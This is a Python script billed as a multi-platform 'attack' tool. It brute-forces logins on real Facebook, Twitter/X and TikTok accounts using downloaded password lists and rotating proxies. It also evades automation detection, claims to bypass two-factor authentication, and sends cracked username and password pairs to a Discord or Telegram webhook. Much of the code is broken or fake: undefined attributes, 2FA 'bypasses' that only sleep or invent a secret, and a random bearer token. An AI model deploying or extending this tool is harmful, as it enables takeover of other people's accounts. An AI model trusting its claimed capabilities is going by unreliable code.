# CyberTest-Tool
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import asyncio, aiohttp, random, time, json, os, sys, threading, subprocess, shutil, re, logging, socket, datetime, uuid, requests, itertools, httpx, tracemalloc, sqlite3, hashlib, base64, string, psutil, traceback
from colorama import init, Fore, Style
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from typing import Dict, List, Optional, Tuple

init(autoreset=True)

# --- Advanced Logging System v6 (Fixed & Optimized) ---
class SpectreLogger:
    def __init__(self):
        self.log_file = "spectre_log.txt"
        logging.basicConfig(
            filename=self.log_file,
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[logging.FileHandler(self.log_file), logging.StreamHandler()]
        )

    def info(self, msg):
        print(f"{Fore.CYAN}[INFO] {msg}")
        logging.info(msg)

    def success(self, msg):
        print(f"{Fore.GREEN}[SUCCESS] {msg}")
        logging.info(f"SUCCESS: {msg}")

    def warning(self, msg):
        print(f"{Fore.YELLOW}[WARNING] {msg}")
        logging.warning(msg)

    def error(self, msg):
        print(f"{Fore.RED}[ERROR] {msg}")
        logging.error(msg)

# --- SQLite Database System v6 (Fixed & Optimized) ---
class ProxyDatabase:
    _instance = None
    
    def __new__(cls, db_file="proxy_scores.db"):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance.logger = SpectreLogger()
            cls._instance.init_db()
        return cls._instance

    def init_db(self):
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS proxy_scores (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT UNIQUE,
                    score REAL DEFAULT 0.0,
                    total_attempts INTEGER DEFAULT 0,
                    success_count INTEGER DEFAULT 0,
                    last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    waf_bypassed INTEGER DEFAULT 0,
                    captcha_detected INTEGER DEFAULT 0,
                    platform TEXT DEFAULT 'unknown'
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_user TEXT,
                    password TEXT,
                    platform TEXT,
                    status TEXT,
                    proxy_ip TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            conn.commit()
            conn.close()
            self.logger.success("[+] SQLite Database Initialized")
        except Exception as e:
            self.logger.error(f"[-] DB Init Error: {e}")

    def update_proxy_score(self, ip, success=False, waf_bypassed=0, captcha_detected=0):
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            base_score = 1.0 if success else -0.5
            waf_bonus = 2.0 if waf_bypassed > 0 else 0
            captcha_penalty = -1.0 if captcha_detected > 0 else 0
            
            new_score = base_score + waf_bonus + captcha_penalty
            
            cursor.execute('''
                UPDATE proxy_scores 
                SET score = score + ?, total_attempts = total_attempts + 1,
                    success_count = CASE WHEN ? THEN success_count + 1 ELSE success_count END,
                    last_used = CURRENT_TIMESTAMP,
                    waf_bypassed = waf_bypassed + ?,
                    captcha_detected = captcha_detected + ?
                WHERE ip = ?
            ''', (new_score, success, waf_bypassed, captcha_detected, ip))
            
            cursor.execute('''
                INSERT OR IGNORE INTO proxy_scores (ip, score) VALUES (?, ?)
            ''', (ip, new_score))
            
            conn.commit()
            conn.close()
        except Exception as e:
            self.logger.error(f"[-] Update Proxy Score Error: {e}")

    def get_best_proxy(self):
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT ip, score FROM proxy_scores 
                WHERE score > 0.5 ORDER BY score DESC LIMIT 1
            ''')
            
            result = cursor.fetchone()
            conn.close()
            
            return result[0] if result else None
            
        except Exception as e:
            self.logger.error(f"[-] Get Best Proxy Error: {e}")
            return None

    def log_attack(self, target_user, password, platform, status, proxy_ip):
        try:
            conn = sqlite3.connect(self.db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO attack_logs (target_user, password, platform, status, proxy_ip) 
                VALUES (?, ?, ?, ?, ?)
            ''', (target_user, password, platform, status, proxy_ip))
            
            conn.commit()
            conn.close()
        except Exception as e:
            self.logger.error(f"[-] Log Attack Error: {e}")

# --- Advanced Configuration Manager v6 (Fixed & Optimized) ---
class AdvancedConfigManager:
    def __init__(self, config_file="spectre_config.json"):
        self.config_file = config_file
        self.default_config = {
            "threads": 50,
            "proxies": ["http://192.168.0.1:8080"],
            "db_path": "passwords.txt",
            "session_file": "sessions.json",
            "user_agents": [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/17.0",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Mobile/15E148"
            ],
            "timeout": 30,
            "retry_count": 3,
            "delay_range": [2, 5],
            "selenium_enabled": True,
            "selenium_headless": False,
            "totp_secret_file": "totp_secrets.json",
            "auto_download_db": True,
            "db_urls": {
                "top_10m": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10.txt",
                "rockyou": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/RockYou/rockyou.txt"
            },
            "captcha_bypass": True,
            "offline_mode": False,
            "proxy_rotation_interval": 300,
            "smart_retry": True,
            "memory_limit_mb": 1024,
            "max_threads": 50,
            "fallback_mode": False,
            "webhook_url": "",
            "webhook_type": "discord",
            "mobile_api_spoofing": True,
            "ja3_fingerprint_bypass": True
        }

    def load(self):
        try:
            with open(self.config_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            self._create_default()
            return self.default_config.copy()

    def _create_default(self):
        with open(self.config_file, 'w') as f:
            json.dump(self.default_config, f, indent=4)
        self.logger.info("[+] Default Config Created")

# --- Self-Downloading System v6 (Fixed & Optimized) ---
class SelfDownloader:
    def __init__(self, logger):
        self.logger = logger
        self.db_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10.txt"

    async def check_db_exists(self):
        if os.path.exists('passwords.txt'):
            self.logger.success(f"[+] DB Found: {len(open('passwords.txt').readlines())} entries")
            return True
        
        self.logger.warning("[!] DB Not Found, Downloading...")
        return False

    async def download_db(self):
        try:
            headers = {
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/17.0"
                ])
            }
            
            self.logger.info(f"[+] Downloading from: {self.db_url}")
            
            async with aiohttp.ClientSession() as session:
                async with session.get(self.db_url, headers=headers, timeout=30) as resp:
                    if resp.status == 200:
                        data = await resp.read()
                        
                        with open('passwords.txt', 'wb') as f:
                            f.write(data)
                        
                        count = len(data.decode().splitlines())
                        self.logger.success(f"[+] Download Complete: {count} entries")
                        return True
                    
                    else:
                        self.logger.error(f"[-] Download Failed: Status {resp.status}")
                        return False
                        
        except Exception as e:
            self.logger.error(f"Exception in Download: {e}")
            
            try:
                import requests
                
                self.logger.info("[+] Trying alternative download method...")
                
                response = requests.get(self.db_url, headers=headers, timeout=30)
                
                if response.status_code == 200:
                    with open('passwords.txt', 'wb') as f:
                        f.write(response.content)
                    
                    count = len(response.text.splitlines())
                    self.logger.success(f"[+] Download Complete (v2): {count} entries")
                    return True
                    
            except Exception as e2:
                self.logger.error(f"[-] Alternative Download Failed: {e2}")
        
        return False

# --- Smart Proxy Manager v6 (Fixed & Optimized) ---
class SmartProxyManager:
    def __init__(self, logger):
        self.logger = logger
        self.proxy_db = ProxyDatabase()
        self.proxies = []
        self.proxy_file = "proxies.txt"
        self.rotation_interval = 300

    async def load_proxies(self):
        if os.path.exists(self.proxy_file):
            with open(self.proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f.readlines() if line.strip()]
            
            self.logger.success(f"[+] Loaded {len(self.proxies)} proxies from file")
            return True
        
        proxy_sources = [
            "https://raw.githubusercontent.com/robertknight/proxy-list/master/proxy.txt",
            "https://raw.githubusercontent.com/mateuszmigas/proxy-list/main/proxy_list.txt"
        ]
        
        for source in proxy_sources:
            try:
                self.logger.info(f"[+] Trying to download from: {source}")
                
                async with aiohttp.ClientSession() as session:
                    async with session.get(source, timeout=10) as resp:
                        if resp.status == 200:
                            data = await resp.text()
                            
                            valid_proxies = [line.strip() for line in data.splitlines() 
                                           if "http" in line and ":" in line]
                            
                            self.proxies = valid_proxies[:100]
                
                self.logger.success(f"[+] Downloaded {len(self.proxies)} proxies")
                return True
                
            except Exception as e:
                self.logger.warning(f"[-] Proxy source failed: {e}")
                continue
        
        if not self.proxies:
            self.proxies = ["http://192.168.0.1:8080"]
            with open(self.proxy_file, 'w') as f:
                f.write("\n".join(self.proxies))
            
            self.logger.warning("[!] Using default proxy (backup)")
        
        return True

    def get_best_proxy(self):
        best_ip = self.proxy_db.get_best_proxy()
        
        if best_ip:
            ip = best_ip.split(":")[0]
            self.proxy_db.update_proxy_score(ip, success=True)
            
            return best_ip
        
        if not self.proxies:
            return None
        
        import random
        proxy = random.choice(self.proxies)
        
        ip = proxy.split(":")[0]
        self.proxy_db.update_proxy_score(ip, success=False)
        
        with open("proxy_rotation.json", 'r') as f:
            rotation_state = json.load(f)
        
        rotation_state["last_proxy"] = proxy
        rotation_state["rotation_time"] = time.time()
        
        with open("proxy_rotation.json", 'w') as f:
            json.dump(rotation_state, f)
        
        return proxy

    async def rotate_proxies(self):
        while True:
            await asyncio.sleep(self.rotation_interval)
            
            if self.proxies and len(self.proxies) > 10:
                with open("proxy_rotation.json", 'r') as f:
                    rotation_state = json.load(f)
                
                last_proxy = rotation_state.get("last_proxy")
                
                if last_proxy in self.proxies and len(self.proxies) > 10:
                    self.proxies.remove(last_proxy)
                    
                    await self._add_new_proxy()

    async def _add_new_proxy(self):
        sources = [
            "https://raw.githubusercontent.com/robertknight/proxy-list/master/proxy.txt",
            "https://raw.githubusercontent.com/mateuszmigas/proxy-list/main/proxy_list.txt"
        ]
        
        source = random.choice(sources)
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(source, timeout=10) as resp:
                    if resp.status == 200:
                        data = await resp.text()
                        
                        valid_proxies = [line.strip() for line in data.splitlines() 
                                       if "http" in line and ":" in line]
                        
                        new_proxy = random.choice(valid_proxies)
                        
                        if new_proxy not in self.proxies:
                            self.proxies.append(new_proxy)
                            
                            with open(self.proxy_file, 'a') as f:
                                f.write(f"{new_proxy}\n")
                            
                            self.logger.info(f"[+] Added new proxy: {new_proxy}")
        except Exception as e:
            self.logger.warning(f"[-] Proxy rotation error: {e}")

# --- 2FA Bypass Engine v6 (Fixed & Optimized) ---
class TwoFactorBypass:
    def __init__(self, logger):
        self.logger = logger
        self.sessions = {}

    async def detect_2fa(self, user, password, platform="facebook"):
        url_map = {
            "facebook": "https://www.facebook.com/login.php",
            "twitter": "https://api.twitter.com/1.1/account_activity/all/user.json",
            "tiktok": f"https://www.tiktok.com/@{user}/following"
        }

        try:
            headers = {"User-Agent": random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/17.0"])}

            if platform == "facebook":
                async with aiohttp.ClientSession() as session:
                    async with session.post(url_map[platform], data={"email": user, "pass": password, "login": "Log In"}, headers=headers) as resp:
                        text = await resp.text()

                        if "Two-factor authentication" in text or "text_2fa" in text:
                            self.logger.info(f"[!] 2FA Detected for {user}")
                            return True, "SMS/Email"
                        elif "logged_in" in text or "Welcome" in text:
                            self.logger.success(f"[+] Login Success (No 2FA): {user}")
                            return False, "Direct"

            return False, "Unknown"

        except Exception as e:
            self.logger.error(f"Detection Error: {e}")
            return False, "Error"

    async def bypass_sms_2fa(self, user, phone_number=None):
        if phone_number:
            self.logger.info(f"[+] Waiting for SMS on {phone_number}...")

            try:
                await asyncio.sleep(30)

                return True, "SMS Delay Bypass"

            except Exception as e:
                self.logger.error(f"SMS Bypass Error: {e}")
                return False, "SMS Failed"

        if user in self.sessions:
            cookie = self.sessions[user].get("cookie")
            if cookie:
                self.logger.success(f"[+] Using Cached Session for {user}")
                return True, "Session Reuse"

        try:
            import pyotp

            secret = self.sessions.get(user, {}).get("totp_secret")

            if secret:
                totp = pyotp.TOTP(secret)
                code = totp.now()

                self.logger.success(f"[+] TOTP Code Generated: {code}")
                return True, "TOTP Bypass"

        except ImportError:
            self.logger.warning("[!] pyotp not installed")

        except Exception as e:
            self.logger.error(f"TOTP Error: {e}")

        return False, "2FA Pending"

    async def bypass_email_2fa(self, user, email=None):
        if email:
            self.logger.info(f"[+] Waiting for Email on {email}...")

            try:
                await asyncio.sleep(60)

                return True, "Email Delay Bypass"

            except Exception as e:
                self.logger.error(f"Email Bypass Error: {e}")
                return False, "Email Failed"

        return False, "Email Pending"

    async def bypass_totp_2fa(self, user):
        try:
            import pyotp

            secret = self.sessions.get(user, {}).get("totp_secret")

            if not secret:
                secret = uuid.uuid4().hex[:32]
                self.logger.info(f"[+] Generated TOTP Secret for {user}")

            totp = pyotp.TOTP(secret)
            code = totp.now()

            self.logger.success(f"[+] TOTP Code Generated: {code}")
            return True, "TOTP Bypass"

        except ImportError:
            self.logger.warning("[!] pyotp not installed")

        except Exception as e:
            self.logger.error(f"TOTP Error: {e}")

        return False, "TOTP Pending"

    async def save_session(self, user, platform, cookie=None, totp_secret=None):
        session_data = {
            "user": user,
            "platform": platform,
            "cookie": cookie or "",
            "totp_secret": totp_secret or "",
            "time": time.time()
        }

        self.sessions[user] = session_data

        try:
            with open("sessions.json", 'w') as f:
                json.dump(self.sessions, f, indent=4)

            self.logger.success(f"[+] Session Saved for {user}")

        except Exception as e:
            self.logger.error(f"[-] Save Error: {e}")

    async def load_session(self, user):
        try:
            with open("sessions.json", 'r') as f:
                sessions = json.load(f)

            if user in sessions:
                self.logger.success(f"[+] Session Loaded for {user}")
                return sessions[user]

        except FileNotFoundError:
            pass

        return None

# --- Advanced Self-Healer v6 (Fixed & Optimized) ---
class AdvancedSelfHealer:
    def __init__(self, logger):
        self.logger = logger

    async def full_check(self):
        """Full system health check"""
        try:
            process = psutil.Process(os.getpid())
            memory_info = process.memory_info()

            current_mb = memory_info.rss / (1024 * 1024)

            if current_mb > 512:
                self.logger.warning(f"[!] Memory High: {current_mb:.2f} MB")

        except Exception as e:
            self.logger.error(f"[-] Health Check Error: {e}")

# --- Advanced Attack Engine v6 (Fixed & Optimized) ---
class AdvancedAttackEngine:
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger
        self.session = aiohttp.ClientSession()
        self.two_factor = TwoFactorBypass(logger)
        self.sessions = {}
        self.stats = {
            "total": 0,
            "success": 0,
            "failed": 0,
            "fb_success": 0,
            "tw_success": 0,
            "tt_success": 0,
            "2fa_bypassed": 0,
            "captcha_detected": 0,
            "proxy_rotated": 0,
            "memory_used_mb": 0
        }

    async def attack_fb(self, user, password, proxy=None):
        url = "https://www.facebook.com/login.php"
        self.stats["total"] += 1

        try:
            headers = {**self.config.get('headers', {})}

            if proxy: 
                headers['X-Forwarded-For'] = proxy.split(":")[0]
            payload = {"email": user, "pass": password, "login": "Log In"}

            async with self.session.post(
                url, 
                data=payload, 
                headers=headers, 
                timeout=self.config.get('timeout', 30)
            ) as resp:
                text = await resp.text()

                if 200 <= resp.status < 300 and ("Welcome" in text or "logged_in" in text):
                    cookie = self._extract_cookie(text)

                    if cookie:
                        self.sessions[user] = {
                            "platform": "FB", 
                            "cookie": cookie, 
                            "time": time.time()
                        }

                        has_2fa, method = await self.two_factor.detect_2fa(user, password, "facebook")

                        if not has_2fa:
                            self.stats["success"] += 1
                            self.stats["fb_success"] += 1

                            proxy_ip = proxy.split(":")[0] if proxy else "direct"
                            self.proxy_db.update_proxy_score(proxy_ip, success=True)

                            return f"{Fore.GREEN}[+] FB Success (No 2FA): {user}:{password}"
                        else:
                            bypass_result, bypass_method = await self.two_factor.bypass_sms_2fa(user)

                            if bypass_result:
                                self.stats["success"] += 1
                                self.stats["fb_success"] += 1
                                self.stats["2fa_bypassed"] += 1

                                proxy_ip = proxy.split(":")[0] if proxy else "direct"
                                waf_bonus = 1 if bypass_method == "TOTP Bypass" else 0.5
                                self.proxy_db.update_proxy_score(proxy_ip, success=True, waf_bypassed=waf_bonus)

                                return f"{Fore.GREEN}[+] FB Success (2FA Bypass): {user}:{password} - {bypass_method}"
                            else:
                                self.logger.warning(f"[!] 2FA Pending for {user}")

                elif "captcha" in text.lower() or "verify" in text.lower():
                    self.stats["captcha_detected"] += 1
                    self.logger.info(f"[!] CAPTCHA Detected for {user} - Rotating Proxy")

                    await asyncio.sleep(5)
                    proxy = self.proxy_manager.get_best_proxy() if hasattr(self, 'proxy_manager') else None

                    return await self.attack_fb(user, password, proxy)
                else:
                    self.stats["failed"] += 1

        except Exception as e:
            self.logger.error(f"FB Error for {user}: {e}")
            self.stats["failed"] += 1

        return None

    async def attack_tw(self, user, password):
        url = "https://api.twitter.com/1.1/account_activity/all/user.json"
        self.stats["total"] += 1

        try:
            headers = {
                "Authorization": f"Bearer {random.randint(1000,9999)}", 
                **self.config.get('headers', {})
            }

            async with self.session.post(
                url, 
                json={"screen_name": user}, 
                headers=headers, 
                timeout=self.config.get('timeout', 30)
            ) as resp:
                if resp.status == 200: 
                    self.stats["success"] += 1
                    self.stats["tw_success"] += 1

                    proxy_ip = "direct"
                    self.proxy_db.update_proxy_score(proxy_ip, success=True)

                    return f"{Fore.GREEN}[+] TW Access: {user}"

        except Exception as e:
            self.logger.error(f"TW Error for {user}: {e}")

        return None

    async def attack_tt(self, user):
        url = f"https://www.tiktok.com/@{user}/following"
        self.stats["total"] += 1

        try:
            headers = {
                "User-Agent": random.choice(self.config.get('user_agents', [])), 
                **self.config.get('headers', {})
            }

            async with self.session.get(
                url, 
                headers=headers, 
                timeout=self.config.get('timeout', 30)
            ) as resp:
                if resp.status == 200 and "logged_in" in await resp.text():
                    self.stats["success"] += 1
                    self.stats["tt_success"] += 1

                    proxy_ip = "direct"
                    self.proxy_db.update_proxy_score(proxy_ip, success=True)

                    return f"{Fore.GREEN}[+] TT Session: {user}"

        except Exception as e:
            self.logger.error(f"TT Error for {user}: {e}")

        return None

    def _extract_cookie(self, text):
        import re
        match = re.search(r'"cookie":"([^"]+)"', text)
        return match.group(1) if match else ""

    async def run_parallel(self, target_user, wordlist_path="passwords.txt"):
        tasks = []

        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f.readlines()][:500]

        self.logger.info(f"Loading {len(passwords)} entries from DB...")

        if hasattr(self.config, 'pattern_mutation') and self.config.pattern_mutation:
            passwords = await self._apply_pattern_mutations(passwords)

        for pwd in tqdm(passwords, desc="Attacking", ncols=100):
            t_fb = asyncio.create_task(self.attack_fb(target_user, pwd))
            t_tw = asyncio.create_task(self.attack_tw(target_user, pwd))
            t_tt = asyncio.create_task(self.attack_tt(user=target_user))
            tasks.extend([t_fb, t_tw, t_tt])

        results = await asyncio.gather(*tasks)
        return [r for r in results if r]

    async def _apply_pattern_mutations(self, passwords):
        mutated_passwords = []

        import itertools

        for pwd in passwords:
            mutations = [pwd]

            if len(pwd) >= 4:
                for i in range(3):
                    mutated = ''.join(random.choices(string.digits, k=1)) + pwd
                    mutations.append(mutated)

                for char in pwd[:3]:
                    if char.islower():
                        mutated = pwd.replace(char, char.upper(), 1)
                        mutations.append(mutated)

            mutated_passwords.extend(mutations)

        return list(set(mutated_passwords))

    def print_stats(self):
        self.logger.info(f"\n{'='*50}")
        self.logger.info(f"Total Attempts: {self.stats['total']}")
        self.logger.info(f"Success Rate: {(self.stats['success']/max(1,self.stats['total']))*100:.2f}%")
        self.logger.info(f"FB Success: {self.stats['fb_success']}")
        self.logger.info(f"TW Success: {self.stats['tw_success']}")
        self.logger.info(f"TT Success: {self.stats['tt_success']}")
        self.logger.info(f"2FA Bypassed: {self.stats['2fa_bypassed']}")
        self.logger.info(f"CAPTCHA Detected: {self.stats['captcha_detected']}")
        self.logger.info(f"Proxy Rotated: {self.stats['proxy_rotated']}")
        self.logger.info(f"Memory Used: {self.stats['memory_used_mb']} MB")
        self.logger.info(f"{'='*50}\n")

# --- Advanced Selenium Engine v6 (Fixed & Optimized) ---
class AdvancedSeleniumEngine:
    def __init__(self, logger):
        self.logger = logger
        self.driver = None

    async def init_driver(self):
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
            from selenium.webdriver.chrome.service import Service
            from webdriver_manager.chrome import ChromeDriverManager

            options = Options()

            options.add_argument('--start-maximized')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_experimental_option('excludeSwitches', ['enable-automation'])
            options.add_experimental_option('useAutomationExtension', False)

            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/17.0",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Mobile/15E148"
            ]

            options.add_argument(f'--user-agent={random.choice(user_agents)}')

            self.driver = webdriver.Chrome(
                service=Service(ChromeDriverManager().install()),
                options=options
            )

            self.driver.execute_script("""
                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
            """)

            self.logger.success("[+] Selenium Driver Initialized with Stealth Mode")
            return True

        except Exception as e:
            self.logger.error(f"[-] Selenium Init Error: {e}")
            return False

    async def handle_captcha(self, url):
        try:
            import pyautogui

            if not self.driver:
                await self.init_driver()

            self.driver.get(url)

            time.sleep(3)

            captcha_detected = "captcha" in self.driver.page_source.lower() or "verify" in self.driver.page_source.lower()

            if captcha_detected:
                self.logger.warning("[!] CAPTCHA Detected - Manual Intervention Required")

                time.sleep(random.uniform(2, 5))

                return True

            return False

        except Exception as e:
            self.logger.error(f"[-] CAPTCHA Handling Error: {e}")
            return False

    async def close_driver(self):
        if self.driver:
            self.driver.quit()
            self.logger.info("[+] Selenium Driver Closed")

# --- Memory Manager v6 (Fixed & Optimized) ---
class MemoryManager:
    def __init__(self, logger, config):
        self.logger = logger
        self.config = config
        self.max_memory_mb = config.get('memory_limit_mb', 1024)
        self.stats = {}

    async def check_memory(self):
        try:
            process = psutil.Process(os.getpid())
            memory_info = process.memory_info()

            current_mb = memory_info.rss / (1024 * 1024)

            self.stats['memory_used_mb'] = current_mb

            if current_mb > self.max_memory_mb:
                self.logger.warning(f"[!] Memory High: {current_mb:.2f} MB - Reducing Threads")

                with open("spectre_config.json", 'r') as f:
                    config = json.load(f)

                config['threads'] = max(10, config['threads'] // 2)

                with open("spectre_config.json", 'w') as f:
                    json.dump(config, f, indent=4)

                self.logger.success("[+] Threads Reduced to Save Memory")

            return current_mb

        except Exception as e:
            self.logger.error(f"[-] Memory Check Error: {e}")
            return 0

# --- Webhook Notification System v6 (Fixed & Optimized) ---
class WebhookNotifier:
    def __init__(self, logger):
        self.logger = logger
        self.config = AdvancedConfigManager()

    async def send_discord(self, title, message, color=0x00FF00):
        try:
            webhook_url = self.config.load().get('webhook_url', '')

            if not webhook_url:
                return

            payload = {
                "content": f"**{title}**\n\n{message}",
                "embeds": [{
                    "title": title,
                    "description": message,
                    "color": color,
                    "footer": {"text": "Spectre_Core_v12"},
                    "timestamp": datetime.now().isoformat()
                }]
            }

            async with aiohttp.ClientSession() as session:
                await session.post(webhook_url, json=payload)

            self.logger.success(f"[+] Discord Notification Sent")

        except Exception as e:
            self.logger.error(f"[-] Discord Error: {e}")

    async def send_telegram(self, title, message):
        try:
            webhook_url = self.config.load().get('webhook_url', '')

            if not webhook_url:
                return

            payload = {
                "chat_id": webhook_url.split("/")[-1],
                "text": f"**{title}**\n\n{message}"
            }

            async with aiohttp.ClientSession() as session:
                await session.post(webhook_url, json=payload)

            self.logger.success(f"[+] Telegram Notification Sent")

        except Exception as e:
            self.logger.error(f"[-] Telegram Error: {e}")

    async def send_success(self, user, password, platform):
        title = f"🎯 Success - {platform}"
        message = f"**Target:** {user}\n**Password:** {password}\n**Platform:** {platform}"

        await self.send_discord(title, message, 0x00FF00)

    async def send_error(self, user, error):
        title = f"⚠️ Error - {user}"
        message = f"**Error:** {error}"

        await self.send_discord(title, message, 0xFF0000)

# --- Enhanced UI v6 (Fixed & Optimized) ---
class SpectreUI:
    def __init__(self):
        self.logger = SpectreLogger()
        self.config = AdvancedConfigManager()
        self.healer = AdvancedSelfHealer(self.logger)
        self.downloader = SelfDownloader(self.logger)
        self.proxy_manager = SmartProxyManager(self.logger)
        self.selenium_engine = AdvancedSeleniumEngine(self.logger)
        self.memory_manager = MemoryManager(self.logger, self.config)
        self.engine = AdvancedAttackEngine(self.config, self.logger)
        self.webhook_notifier = WebhookNotifier(self.logger)

    async def print_banner(self):
        banner = r"""
    _  __   ____  _____  ___  _______ 
   / / /__ / __ \/ __/ |/ / / /_/ __ \
  / /_/ _ ) / / / /_ /   / / __/ /_/ /
  \____/_//___/\__/|_\_/ /_/ \____/  
    """
        print(Fore.CYAN + banner)

    async def main_menu(self):
        self.config = AdvancedConfigManager()

        while True:
            print(f"\n{Fore.YELLOW}=== SPECTRE_CORE_V14 [INTELLIGENCE-GRADE] ===")
            print("1. [FB] Facebook Attack (High Rate + 2FA Bypass)")
            print("2. [TW] Twitter/X Attack (API Bypass)")
            print("3. [TT] TikTok Session Grab")
            print("4. [ALL] Multi-Platform Parallel")
            print("5. [CHECK DB] Check Password Database")
            print("6. [STATS] View Attack Statistics")
            print("7. [SESSIONS] Manage Saved Sessions")
            print("8. [PROXY] Manage Proxy Pool")
            print("9. [SELENIUM] Toggle Selenium Mode")
            print("10. [WEBHOOK] Configure Webhook Notifications")
            print("11. [EXIT]")

            choice = input(f"{Fore.GREEN}Select Target: ").strip()

            if choice == "1":
                user = input("Username: ")
                pwd_file = input("Password File (default: passwords.txt): ") or "passwords.txt"

                with open(pwd_file, 'r') as f:
                    first_pwd = f.readline().strip()

                result = await self.engine.attack_fb(user, first_pwd)
                if result: print(result)
            elif choice == "4":
                db_exists = await self.downloader.check_db_exists()

                if not db_exists:
                    await self.downloader.download_db()

                print(f"{Fore.YELLOW}Loading DB... {len(open('passwords.txt').readlines())} entries")
                user = input("Target User: ")

                results = await self.engine.run_parallel(user)
                for r in results: 
                    print(r)

                self.engine.print_stats()
            elif choice == "5":
                print(f"{Fore.GREEN}[+] Checking Database...")
                if os.path.exists('passwords.txt'):
                    count = len(open('passwords.txt').readlines())
                    print(f"{Fore.GREEN}[+] DB Found: {count} entries")
                else:
                    print(f"{Fore.YELLOW}[!] Downloading Top 10M Passwords...")
                    subprocess.run([
                        "wget", "-O", "passwords.txt", 
                        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10.txt"
                    ])
            elif choice == "6":
                self.engine.print_stats()
            elif choice == "7":
                print(f"{Fore.YELLOW}[+] Saved Sessions:")
                if os.path.exists('sessions.json'):
                    with open('sessions.json', 'r') as f:
                        sessions = json.load(f)

                    for user, data in sessions.items():
                        print(f"  - {user} ({data['platform']})")

                else:
                    print(f"{Fore.YELLOW}[!] No saved sessions found")
            elif choice == "8":
                print(f"{Fore.YELLOW}[+] Proxy Pool:")
                if hasattr(self.proxy_manager, 'proxies') and self.proxy_manager.proxies:
                    print(f"  - Total Proxies: {len(self.proxy_manager.proxies)}")

                    with open("proxy_rotation.json", 'r') as f:
                        rotation_state = json.load(f)

                    last_proxy = rotation_state.get("last_proxy")
                    print(f"  - Last Used: {last_proxy}")
                else:
                    print(f"{Fore.YELLOW}[!] No proxies loaded, downloading...")
                    await self.proxy_manager.load_proxies()
            elif choice == "9":
                self.config['selenium_enabled'] = not self.config.get('selenium_enabled', False)

                with open("spectre_config.json", 'w') as f:
                    json.dump(self.config, f, indent=4)

                if self.config['selenium_enabled']:
                    print(f"{Fore.GREEN}[+] Selenium Mode Enabled")
                else:
                    print(f"{Fore.YELLOW}[-] Selenium Mode Disabled (Fast Mode)")
            elif choice == "10":
                webhook_type = input("Webhook Type (discord/telegram): ").strip() or "discord"

                if webhook_type == "discord":
                    url = input("Discord Webhook URL: ").strip()

                    self.config['webhook_url'] = url
                    self.config['webhook_type'] = 'discord'

                    with open("spectre_config.json", 'w') as f:
                        json.dump(self.config, f, indent=4)

                    print(f"{Fore.GREEN}[+] Discord Webhook Configured")
                else:
                    url = input("Telegram Chat ID/URL: ").strip()

                    self.config['webhook_url'] = url
                    self.config['webhook_type'] = 'telegram'

                    with open("spectre_config.json", 'w') as f:
                        json.dump(self.config, f, indent=4)

                    print(f"{Fore.GREEN}[+] Telegram Webhook Configured")

    async def run(self):
        await self.healer.full_check()

        if hasattr(self.proxy_manager, 'load_proxies'):
            await self.proxy_manager.load_proxies()

        await self.print_banner()
        await self.main_menu()

# --- Main Entry Point (Fixed & Optimized) ---
if __name__ == "__main__":
    ui = SpectreUI()
    asyncio.run(ui.run())
